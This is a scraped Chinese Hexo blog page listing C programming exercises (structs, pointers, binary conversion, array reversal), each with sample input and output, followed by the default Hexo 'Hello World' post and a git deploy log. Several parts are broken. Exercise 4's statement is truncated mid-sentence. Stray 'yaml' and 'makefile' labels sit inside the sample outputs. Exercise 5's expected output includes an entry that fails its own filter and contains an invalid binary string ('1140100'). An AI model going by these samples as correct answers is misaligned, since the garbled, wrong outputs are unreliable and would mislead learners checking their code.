<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1 3 7 15 31</span><br><span class="line">7</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yaml</span><br><span class="line">1111</span><br><span class="line">11111</span><br></pre></td></tr></table></figure>

<h4 id="4定义一个名为-BinaryString-的结构体，包含一个字符串-str-用于存储二进制数字，和一个整型变量-length-用于存储字符串的长度。编写一个函数，ring-结构体数组中，最后返回这个数组。"><a href="#4定义一个名为-BinaryString-的结构体，包含一个字符串-str-用于存储二进制数字，和一个整型变量-length-用于存储字符串的长度。编写一个函数，ring-结构体数组中，最后返回这个数组。" class="headerlink" title="4定义一个名为 BinaryString 的结构体，包含一个字符串 str 用于存储二进制数字，和一个整型变量 length 用于存储字符串的长度。编写一个函数，ring&#96; 结构体数组中，最后返回这个数组。"></a>4定义一个名为 <code>BinaryString</code> 的结构体，包含一个字符串 <code>str</code> 用于存储二进制数字，和一个整型变量 <code>length</code> 用于存储字符串的长度。编写一个函数，ring&#96; 结构体数组中，最后返回这个数组。</h4><p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">makefile</span><br><span class="line">H: 1001000</span><br><span class="line">e: 1100101</span><br><span class="line">l: 1101100</span><br><span class="line">l: 1101100</span><br><span class="line">o: 1101111</span><br></pre></td></tr></table></figure>

<h4 id="5编写一个-C-程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于-n-的结构体的字符串的二进制表示。"><a href="#5编写一个-C-程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数-n-作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于-n-的结构体的字符串的二进制表示。" class="headerlink" title="5编写一个 C 程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数 n 作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于 n 的结构体的字符串的二进制表示。"></a>5编写一个 C 程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数 <code>n</code> 作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于 <code>n</code> 的结构体的字符串的二进制表示。</h4><p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">1 Hello</span><br><span class="line">15 World</span><br><span class="line">31 Test</span><br><span class="line">20</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makefile</span><br><span class="line">World: 1010111 1101111 1140100 1100100 1100100</span><br><span class="line">Test: 1010100 1100101 1110011 1110100</span><br></pre></td></tr></table></figure>

<h4 id="6编写一个-C-程序，定义一个名为-Array-的结构体，包含两个成员：一个整型指针-data-用于存储数组的元素，一个整型变量-length-用于存储数组的长度。使用动态内存分配创建一个-Array-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。"><a href="#6编写一个-C-程序，定义一个名为-Array-的结构体，包含两个成员：一个整型指针-data-用于存储数组的元素，一个整型变量-length-用于存储数组的长度。使用动态内存分配创建一个-Array-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。" class="headerlink" title="6编写一个 C 程序，定义一个名为 Array 的结构体，包含两个成员：一个整型指针 data 用于存储数组的元素，一个整型变量 length 用于存储数组的长度。使用动态内存分配创建一个 Array 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。"></a>6编写一个 C 程序，定义一个名为 <code>Array</code> 的结构体，包含两个成员：一个整型指针 <code>data</code> 用于存储数组的元素，一个整型变量 <code>length</code> 用于存储数组的长度。使用动态内存分配创建一个 <code>Array</code> 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。</h4><p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1 3 7 15 31</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31 15 7 3 1</span><br></pre></td></tr></table></figure>

<h6 id="7编写一个-C-程序，定义一个名为-Buffer-的结构体，包含两个成员：一个字符指针-data-用于存储字符串，一个整型变量-length-用于存储字符串的长度。使用动态内存分配创建一个-Buffer-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。"><a href="#7编写一个-C-程序，定义一个名为-Buffer-的结构体，包含两个成员：一个字符指针-data-用于存储字符串，一个整型变量-length-用于存储字符串的长度。使用动态内存分配创建一个-Buffer-结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。" class="headerlink" title="7编写一个 C 程序，定义一个名为 Buffer 的结构体，包含两个成员：一个字符指针 data 用于存储字符串，一个整型变量 length 用于存储字符串的长度。使用动态内存分配创建一个 Buffer 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。"></a>7编写一个 C 程序，定义一个名为 <code>Buffer</code> 的结构体，包含两个成员：一个字符指针 <code>data</code> 用于存储字符串，一个整型变量 <code>length</code> 用于存储字符串的长度。使用动态内存分配创建一个 <code>Buffer</code> 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。</h6><p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HELLO WORLD</span><br></pre></td></tr></table></figure>

<h4 id="8编写一个-C-程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。"><a href="#8编写一个-C-程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。" class="headerlink" title="8编写一个 C 程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。"></a>8编写一个 C 程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。</h4><p>输入示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3 3</span><br><span class="line">1 2 3</span><br><span class="line">4 5 6</span><br><span class="line">7 8 9</span><br></pre></td></tr></table></figure>

<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">45</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> title: xxx    <span class="comment">//在此处添加你的标题。 </span></span><br><span class="line"></span><br><span class="line">date: <span class="number">2016</span><span class="number">-10</span><span class="number">-07</span> <span class="number">13</span>:<span class="number">38</span>:<span class="number">49</span>   <span class="comment">//在此处输入编辑这篇文章的时间。 </span></span><br><span class="line"></span><br><span class="line">tags: xxx    <span class="comment">//在此处输入这篇文章的标签。 </span></span><br><span class="line"></span><br><span class="line">categories: xxx    <span class="comment">//在此处输入这篇文章的分类。 ---</span></span><br></pre></td></tr></table></figure>




      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80/" rel="tag">C语言</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/%E9%A2%98%E7%9B%AE/">题目</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/26/hello-world/" class="article-date">
  	<time datetime="2024-03-26T13:10:50.200Z" itemprop="datePublished">2024-03-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/26/hello-world/">
        Hello World
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
<p><img src="/2024/03/26/hello-world/002917-16858097570092.jpg" alt="002917-16858097570092"></p>
<p>INFO  Copying files from extend dirs…<br>On branch master<br>nothing to commit, working tree clean<br>Everything up-to-date<br>branch ‘master’ set up to track ‘<a href="mailto:&#x67;&#105;&#x74;&#64;&#103;&#105;&#116;&#x68;&#117;&#98;&#46;&#x63;&#x6f;&#x6d;">&#x67;&#105;&#x74;&#64;&#103;&#105;&#116;&#x68;&#117;&#98;&#46;&#x63;&#x6f;&#x6d;</a>:2023478&#x2F;2023478.github.io.git&#x2F;main’.<br>INFO  Deploy done: git</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2024 wgiegie
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>